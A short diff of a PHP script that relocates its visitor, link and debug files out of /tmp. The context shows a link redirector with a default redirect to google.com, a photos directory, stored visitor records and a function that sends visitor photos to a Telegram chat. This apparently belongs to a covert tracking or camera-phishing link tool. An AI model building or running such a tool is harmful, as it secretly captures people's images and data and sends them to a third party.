@@ -5,15 +5,15 @@ require_once 'config.php';
 if (!file_exists("photos")) {
     mkdir("photos", 0755, true);
 }
-if (!file_exists("/tmp/visitors.json")) {
-    file_put_contents("/tmp/visitors.json", json_encode([]));
+if (!file_exists("visitors.json")) {
+    file_put_contents("visitors.json", json_encode([]));
 }
-if (!file_exists("/tmp/links.json")) {
-    file_put_contents("/tmp/links.json", json_encode([]));
+if (!file_exists("links.json")) {
+    file_put_contents("links.json", json_encode([]));
 }
 
 $id = $_GET['id'] ?? '';
-$db = json_decode(file_get_contents("/tmp/links.json"), true) ?? [];
+$db = json_decode(file_get_contents("links.json"), true) ?? [];
 
 $linkData = $db[$id] ?? null;
 $targetUrl = $linkData['url'] ?? 'https://google.com';
@@ -54,7 +54,7 @@ function sendPhotoToTelegram($chatId, $photoPath, $visitorId) {
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
     
-    file_put_contents("/tmp/debug.log", date('Y-m-d H:i:s') . " - Photo send: $httpCode\n", FILE_APPEND);
+    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Photo send: $httpCode\n", FILE_APPEND);
     
     return $httpCode == 200;
 }
@@ -161,7 +161,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         }
     }
     
-    file_put_contents("/tmp/visitors.json", json_encode($visitors));
+    file_put_contents("visitors.json", json_encode($visitors));
     echo json_encode(['status' => 'success']);
     exit;
 }
